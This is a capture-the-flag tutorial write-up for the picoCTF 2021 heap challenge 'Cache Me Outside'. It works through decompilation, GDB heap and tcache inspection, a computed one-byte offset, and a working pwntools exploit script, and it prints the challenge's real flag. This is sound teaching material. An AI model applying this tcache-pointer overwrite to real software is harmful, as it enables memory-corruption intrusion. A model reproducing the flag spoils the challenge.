---
title: First Exploit
layout: default
nav_order: 1
parent: Exploits
---

# Cache Me Outside

### Challenge Description

- **CTF Name:** picoCTF 2021
- **Challenge Name:** Cache Me Outside
- **Challenge Category:** Binary Exploitation
- **Challenge Points:** 90

The first binary we will conduct a heap exploit on comes from the 2021 picoCTF competition. The task description reads:

> While being super relevant with my meme references, I wrote a program to see how much you understand heap allocations. `nc mercury.picoctf.net 49825` heapedit Makefile libc.so.6

- the command `nc mercury.picoctf.net 49825` allows us to execute the binary on a remote server
- The file `heapedit` contains the binary to exploit.
- The file `Makefile` contains the contents of the Make file used to create the binary.
- The file `libc.so.6` contains the libc used when the binary was compiled.

There is an additional hint which we will use that reads:

> It may be helpful to read a little bit on GLIBC's tcache.

### Initial Observations

Running the provided command gives us the message:

```
You may edit one byte in the program.
Address: 
```

And prompts us to enter an address. After entering the value 100, the program then prompts us to enter a value. Entering 100 again reveals the string:

```
t help you: this is a random string.
```

The Makefile contains the following contents:

``` make
all:
	gcc -Xlinker -rpath=./ -Wall -m64 -pedantic -no-pie --std=gnu99 -o heapedit 
	heapedit.c

clean:
	rm heapedit
```

Of particular interest are the following flags:
- The `-no-pie` flag. This tells the compiler not to make a Position Independent Executable (PIE). A PIE is a requirement to enabling ASLR, so we can infer that the executable is not using ASLR. This should make the challenge a bit easier.
- The `-rpath=./` flag. The rpath specifies the search path that the dynamic linker will use to obtain the required library files. If this doesn't make too much sense right now that is ok - just notice that the linker will be searching the directory that contains `heapedit` for the the libraries (indicated by the `./` file path).

The hint indicates that the exploit is going to involve the tcache. We will pay particular attention to the tcache bins when analysing the programs execution.

### Preparing The Local Binary For Analysis

Different glibc versions are compatible with different dynamic linkers i.e. it is likely that the dynamic linker being used by your flavour of linux will not compile the binary. To fix this I have provided you with a link to the correct linker.

After downloading the linker into the same directory as your binary, the binary will need to be patched using `patchelf`:

```
$ patchelf --set-interpreter ld-2.27.so heapedit
```

We will also see that the binary expects a `flag.txt` file to be present, which it will use to read the flag in. We will create our own `flag.txt` file and fill it with:

```
heaptutorial{cache_me_outside}
```
### Understanding the program through decompilation

Disassembling and decompiling the program with Ghidra produces the following output:

```
undefined8 main(void)

{
  long in_FS_OFFSET;
  undefined local_a9;
  int local_a8;
  int local_a4;
  undefined8 *local_a0;
  undefined8 *local_98;
  FILE *local_90;
  undefined8 *local_88;
  void *local_80;
  undefined8 local_78;
  undefined8 local_70;
  undefined8 local_68;
  undefined local_60;
  char local_58 [72];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  setbuf(stdout,(char *)0x0);
  local_90 = fopen("flag.txt","r");
  fgets(local_58,0x40,local_90);
  local_78 = 0x2073692073696874;
  local_70 = 0x6d6f646e61722061;
  local_68 = 0x2e676e6972747320;
  local_60 = 0;
  local_a0 = (undefined8 *)0x0;
  for (local_a4 = 0; local_a4 < 7; local_a4 = local_a4 + 1) {
    local_98 = (undefined8 *)malloc(0x80);
    if (local_a0 == (undefined8 *)0x0) {
      local_a0 = local_98;
    }
    *local_98 = 0x73746172676e6f43;
    local_98[1] = 0x662072756f592021;
    local_98[2] = 0x203a73692067616c;
    *(undefined *)(local_98 + 3) = 0;
    strcat((char *)local_98,local_58);
  }
  local_88 = (undefined8 *)malloc(0x80);
  *local_88 = 0x5420217972726f53;
  local_88[1] = 0x276e6f7720736968;
  local_88[2] = 0x7920706c65682074;
  *(undefined4 *)(local_88 + 3) = 0x203a756f;
  *(undefined *)((long)local_88 + 0x1c) = 0;
  strcat((char *)local_88,(char *)&local_78);
  free(local_98);
  free(local_88);
  local_a8 = 0;
  local_a9 = 0;
  puts("You may edit one byte in the program.");
  printf("Address: ");
  __isoc99_scanf(&DAT_00400b48,&local_a8);
  printf("Value: ");
  __isoc99_scanf(&DAT_00400b53,&local_a9);
  *(undefined *)((long)local_a8 + (long)local_a0) = local_a9;
  local_80 = malloc(0x80);
  puts((char *)((long)local_80 + 0x10));
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```

From the Ghidra output we can see that the program:
- Reads the flag in from a file
- Performs 7 identical heap allocations
- Performs another heap allocation, although different from the first 7
- Reads in the location and value of the byte to be changed
- Makes the necessary byte adjustment
- Allocates another chunk of memory, which is used to display some output

Hopefully this gives you a clearer idea of how the program is working. Before moving on it is worthwhile paying attention to how the user input actually manipulates the program. This is done by the line:

```
*(undefined *) ((long)local_a8 + (long)local_a0) = local_a9
```

Using the program context, `local_a8` and `local_a9` are respectively the address and value entered by the user. Less clear is the value of `local_a0`. Looking back through the main function, `local_a0` is initially set to 0 before being set to equal the address returned by the first call to malloc in the 7 identical allocations. In this sense then, the value of `local_a8` is actually an *offset* from this memory location, as opposed to a program address. As such, we will now refer to it as an offset.

The Ghidra output is also useful for obtaining key memory addresses to set breakpoints at. Selecting a line in the decompiled output reveals the address of the corresponding assembly instruction in the disassembled output.

While I encourage you to try a variety of addresses, for the purposes of this explanation we will choose the following addresses. 
- 0x004009a3 corresponding to the line `free(local_98)`
- 0x004009cc corresponding to the line `puts("You may edit one byte in the program");`
- 0x00400a5e corresponding to the line `puts((char *)((long)local_80 +0x10));`

### Finding the Vulnerability

Lets now execute the binary with GDB by typing the command `gdb heapedit`. This will start an interactive debugging session, indicated by the `gef>` prompt (note that this tutorial requires the gef wrapper for GDB to be installed). We will use this to examine how the program is manipulating memory, allowing us to find the vulnerability.

The first thing we need to do is set some breakpoints. We need to set breakpoints at the three addresses found above, plus the main function (refer to the section on gdb to recall how this is done).

We can now begin the program by entering `run` which immediately halts our program at the first breakpoint in our program, located at the top of the main function. We can explore the content of the heap bins with the `heap bins` command - all of the bins are empty as no calls to free have been made yet:

```
gef➤  heap bins
[!] No heap section
[+] Uninitialized tcache for thread 1
───────────────────────────────────── Fastbins for arena at 0x7ffff7bebc40 ─────────────────────────────────────
Fastbins[idx=0, size=0x20] 0x00
Fastbins[idx=1, size=0x30] 0x00
Fastbins[idx=2, size=0x40] 0x00
Fastbins[idx=3, size=0x50] 0x00
Fastbins[idx=4, size=0x60] 0x00
Fastbins[idx=5, size=0x70] 0x00
Fastbins[idx=6, size=0x80] 0x00
─────────────────────────────────── Unsorted Bin for arena at 0x7ffff7bebc40 ───────────────────────────────────
[*] Invalid backward and forward bin pointers(fw==bk==NULL)
──────────────────────────────────── Small Bins for arena at 0x7ffff7bebc40 ────────────────────────────────────
[*] Invalid backward and forward bin pointers(fw==bk==NULL)
[+] Found 0 chunks in 0 small non-empty bins.
──────────────────────────────────── Large Bins for arena at 0x7ffff7bebc40 ────────────────────────────────────
[*] Invalid backward and forward bin pointers(fw==bk==NULL)
[+] Found 0 chunks in 0 large non-empty bins.
```

We can also obtain information about heap chunks by typing `heap chunks` - here it produces an error as no chunks have been allocated yet.

```
gef➤  heap chunks
[!] Could not find heap for arena
```

We can now resume execution by typing `continue` which takes us to the next breakpoint, set after allocating the flag buffers and the dummy buffer. Taking a look at the chunks reveals the following layout:

```
gef➤  heap chunks
Chunk(addr=0x602010, size=0x250, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x0000000000602010     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]
Chunk(addr=0x602260, size=0x230, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x0000000000602260     88 24 ad fb 00 00 00 00 97 24 60 00 00 00 00 00    .$.......$`.....]
Chunk(addr=0x602490, size=0x1010, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x0000000000602490     6d 79 66 6c 61 67 0a 00 00 00 00 00 00 00 00 00    myflag..........]
Chunk(addr=0x6034a0, size=0x90, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x00000000006034a0     43 6f 6e 67 72 61 74 73 21 20 59 6f 75 72 20 66    Congrats! Your f]
Chunk(addr=0x603530, size=0x90, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x0000000000603530     43 6f 6e 67 72 61 74 73 21 20 59 6f 75 72 20 66    Congrats! Your f]
Chunk(addr=0x6035c0, size=0x90, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x00000000006035c0     43 6f 6e 67 72 61 74 73 21 20 59 6f 75 72 20 66    Congrats! Your f]
Chunk(addr=0x603650, size=0x90, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x0000000000603650     43 6f 6e 67 72 61 74 73 21 20 59 6f 75 72 20 66    Congrats! Your f]
Chunk(addr=0x6036e0, size=0x90, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x00000000006036e0     43 6f 6e 67 72 61 74 73 21 20 59 6f 75 72 20 66    Congrats! Your f]
Chunk(addr=0x603770, size=0x90, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x0000000000603770     43 6f 6e 67 72 61 74 73 21 20 59 6f 75 72 20 66    Congrats! Your f]
Chunk(addr=0x603800, size=0x90, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x0000000000603800     43 6f 6e 67 72 61 74 73 21 20 59 6f 75 72 20 66    Congrats! Your f]
Chunk(addr=0x603890, size=0x90, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x0000000000603890     53 6f 72 72 79 21 20 54 68 69 73 20 77 6f 6e 27    Sorry! This won']
Chunk(addr=0x603920, size=0x1f6f0, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  top chunk
```

The output shows 8 chunks of size 0x90, of which 7 of these contain the partial contents "Congrats! Your f" - these chunks are almost certainly our flag buffers. The final chunk of size 0x90 has contents "Sorry! This won" and is thus going to be our dummy buffer. First three chunks in the output are related to reading in the flag and the bottom chunk is (paradoxically) the top chunk. We will only be concerned with the chunks containing the flag and dummy buffers.

Resuming execution with `continue` takes us to the breakpoint after the dummy buffer and one of the flag buffers have been freed. Inspecting the bins with `heap bins` now reveals that the tcache contains two chunks of size 0x90, with addresses 0x603800 and 0x603890. 

```
gef➤  heap bins
──────────────────────────────────────────── Tcachebins for thread 1 ────────────────────────────────────────────
Tcachebins[idx=7, size=0x90, count=2] ←  Chunk(addr=0x603890, size=0x90, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  Chunk(addr=0x603800, size=0x90, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA) 
───────────────────────────────────── Fastbins for arena at 0x7ffff7bebc40 ─────────────────────────────────────
Fastbins[idx=0, size=0x20] 0x00
Fastbins[idx=1, size=0x30] 0x00
Fastbins[idx=2, size=0x40] 0x00
Fastbins[idx=3, size=0x50] 0x00
Fastbins[idx=4, size=0x60] 0x00
Fastbins[idx=5, size=0x70] 0x00
Fastbins[idx=6, size=0x80] 0x00
─────────────────────────────────── Unsorted Bin for arena at 0x7ffff7bebc40 ───────────────────────────────────
[+] Found 0 chunks in unsorted bin.
──────────────────────────────────── Small Bins for arena at 0x7ffff7bebc40 ────────────────────────────────────
[+] Found 0 chunks in 0 small non-empty bins.
──────────────────────────────────── Large Bins for arena at 0x7ffff7bebc40 ────────────────────────────────────
[+] Found 0 chunks in 0 large non-empty bins.
```

We can use `heap chunks` to determine which is the dummy buffer and which is a flag buffer. 

```
gef➤  heap chunks
Chunk(addr=0x602010, size=0x250, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x0000000000602010     00 00 00 00 00 00 00 02 00 00 00 00 00 00 00 00    ................]
Chunk(addr=0x602260, size=0x230, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x0000000000602260     88 24 ad fb 00 00 00 00 97 24 60 00 00 00 00 00    .$.......$`.....]
Chunk(addr=0x602490, size=0x1010, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x0000000000602490     6d 79 66 6c 61 67 0a 00 00 00 00 00 00 00 00 00    myflag..........]
Chunk(addr=0x6034a0, size=0x90, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x00000000006034a0     43 6f 6e 67 72 61 74 73 21 20 59 6f 75 72 20 66    Congrats! Your f]
Chunk(addr=0x603530, size=0x90, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x0000000000603530     43 6f 6e 67 72 61 74 73 21 20 59 6f 75 72 20 66    Congrats! Your f]
Chunk(addr=0x6035c0, size=0x90, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x00000000006035c0     43 6f 6e 67 72 61 74 73 21 20 59 6f 75 72 20 66    Congrats! Your f]
Chunk(addr=0x603650, size=0x90, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x0000000000603650     43 6f 6e 67 72 61 74 73 21 20 59 6f 75 72 20 66    Congrats! Your f]
Chunk(addr=0x6036e0, size=0x90, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x00000000006036e0     43 6f 6e 67 72 61 74 73 21 20 59 6f 75 72 20 66    Congrats! Your f]
Chunk(addr=0x603770, size=0x90, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x0000000000603770     43 6f 6e 67 72 61 74 73 21 20 59 6f 75 72 20 66    Congrats! Your f]
Chunk(addr=0x603800, size=0x90, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x0000000000603800     00 00 00 00 00 00 00 00 21 20 59 6f 75 72 20 66    ........! Your f]
Chunk(addr=0x603890, size=0x90, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x0000000000603890     00 38 60 00 00 00 00 00 68 69 73 20 77 6f 6e 27    .8`.....his won']
Chunk(addr=0x603920, size=0x1f6f0, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  top chunk
```

So 0x603800 is the address of the flag buffer and 0x603890 is the address of the dummy buffer. We also have further evidence that these chunks are no longer allocated as the start of their data segments have been overwritten, likely with data for managing the tcache.

Recall that the tcache is an array containing pointers to linked lists which contain freed chunks of the same size. Since both the flag buffer and the dummy buffer have size 0x90 they are added to the same linked list.

We now `continue` execution to our final breakpoint - after the final memory allocation. Note that in order to reach this breakpoint the program will ask you to enter the location and value details of the byte modification. Inspecting the heap bins reveals only one chunk in the tcache bin, which corresponds to the flag buffer.

```
gef➤  heap bins
──────────────────────────────────────────── Tcachebins for thread 1 ────────────────────────────────────────────
Tcachebins[idx=7, size=0x90, count=1] ←  Chunk(addr=0x603800, size=0x90, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA) 
───────────────────────────────────── Fastbins for arena at 0x7ffff7bebc40 ─────────────────────────────────────
Fastbins[idx=0, size=0x20] 0x00
Fastbins[idx=1, size=0x30] 0x00
Fastbins[idx=2, size=0x40] 0x00
Fastbins[idx=3, size=0x50] 0x00
Fastbins[idx=4, size=0x60] 0x00
Fastbins[idx=5, size=0x70] 0x00
Fastbins[idx=6, size=0x80] 0x00
─────────────────────────────────── Unsorted Bin for arena at 0x7ffff7bebc40 ───────────────────────────────────
[+] Found 0 chunks in unsorted bin.
──────────────────────────────────── Small Bins for arena at 0x7ffff7bebc40 ────────────────────────────────────
[+] Found 0 chunks in 0 small non-empty bins.
──────────────────────────────────── Large Bins for arena at 0x7ffff7bebc40 ────────────────────────────────────
[+] Found 0 chunks in 0 large non-empty bins.
```

The other chunk has been used to service the malloc request, since the request was for a chunk of size 0x90 which was readily available in the tcache. Since the memory is unmodified after being allocated, printing its contents reveals the contents of the dummy buffer i.e. not the flag.

Observe that if instead the chunk containing the flag buffer had been used to service the final call to malloc, then the final output would likely contain our flag. Lets see how this might be possible by looking at the setup of the tcache right before the final memory allocation:


```
  tcache array       0x603890            0x603800
+--------------+    +--------------+    +-------------+
| 0x603890     | -> | Dummy Buffer | -> | Flag Buffer |
+--------------+    +--------------+    +-------------+
|              |
+--------------+
      ...
+--------------+
|              |
+--------------+
```

Without attacker intervention, if the tcache can service a malloc request, it will always use the first chunk available. For us this is the chunk containing the dummy buffer, as it is freed after the chunk containing the flag buffer. Importantly, the only way the tcache knows which chunk is "first" is by the pointer value stored in the tcache array, which in this case is 0x603890. Changing this pointer value to contain the address of the chunk containing the flag buffer would result in that chunk being used to service the malloc request and the subsequent revealing of the flag. 

```
  tcache array       0x603800            0x603890
+--------------+    +--------------+    +--------------+
| 0x603800     | -> | Flag Buffer  | <- | Dummy Buffer |
+--------------+    +--------------+    +--------------+
|              |
+--------------+
      ...
+--------------+
|              |
+--------------+
```

This is promising, but how do we overwrite the address in the tcache array? Observe that the addresses of the chunks for the flag buffer and dummy buffer only differ in the second last hexadecimal digit (one has a 9 while the other has a 0). Thus modifying the last two digits of the tcache array value from 90 to 00 would be sufficient to have the tcache array point to the flag buffer chunk. But two digits of a hexadecimal value encodes one byte, and the program allows us to modify the contents of any single byte. If we can find out where this byte is in memory, we should be able to use the program to modify its contents and retrieve the flag!

### Finding the location of the byte

Restart the program with gdb (`gdb heapedit`) and set a breakpoint at 0x4009cc (`break *0x4009cc`). Recall that this is after the two chunks have been freed, but before the final memory allocation, meaning the tcache array contains a pointer to (or the address of) the flag buffer. We would like to find where in memory this pointer is being stored, so we can overwrite it. To do this we enter the command `search-pattern 0x603890` into gdb, which produces the following output:

```
gef> search-pattern 0x603890
[+] Searching '\x90\x38\x60' in memory
[+] In '[heap]'(0x602000-0x623000), permission=rw-
  0x602088 - 0x602094  →   "\x90\x38\x60[...]"
[+] In '[stack]'(0x7ffffffde000-0x7ffffffff000), permission=rw-
  0x7fffffffe240 - 0x7fffffffe24c  →   "\x90\x38\x60[...]"
```

We will ignore the stack part, as we know that the location we are after is in the heap. We can interpret the heap output information as meaning our pointer starts at address 0x602088. As it turns out, this is actually the precise memory location of our target byte `\x90`,  as indicated by the contents between the quotations. This reversal of the address is due to our binary being *little endian*, essentially meaning that the least significant byte is stored at the lowest memory address (we won't discuss this further, there are ample pre existing resources on the topic).

This address is not quite sufficient, as the Ghidra decompilation showed us the address was actually being used as an *offset* from the address from the first flag buffer chunk allocated. Looking back through our gdb outputs, we can see that the address of this chunk is 0x6034a0. Thus the offset can be computed as 0x602088 - 0x6034A0 = -5144.

### Crafting the exploit

Let us now write a simple pwntools script to pwn this binary!

``` python
from pwn import *

def conn():
	if args.LOCAL:
		r = process([ELF("./heapedit").path])
	else:
		r = remote("mercury.picoctf.net", 49825)
	return r

def main():
	r = conn()
	r.recvuntil(b"Address: ")
	r.send(b"-5144\n")
	r.recvuntil(b"Value: ")
	r.send(p64(0))
	r.interactive()

if __name__ == "__main__":
	main()
```

Lets look at some key parts of the script:
- The script imports all functions from the pwntools `pwn` library
- The `conn()` function sets up the binary, which can be either remote or local depending on the arguments specified.
- The main function executes until the "Address: " line is produced by the binary. At this point the script sends the string "-5144" to the binary as this is the offset of our byte to modify.
- The main function then executes until the "Value: " line is produced by the binary. Then sends a null byte - the `p64()` function converts an integer representation to a bytes representation. Applying this to the value 0 sends the null byte.
- The script finishes by handing control back to us with the `r.interactive()` call.

Running the script with the LOCAL argument produces the following output:

```
lag is: heapexploit{cache_me_outside}
```

Running the script without the LOCAL argument connect to the remote server containing the actual flag, producing the following output:

```
lag is: picoCTF{53be92758865dfd2779fa96526dbd0a3}
```

This is our flag.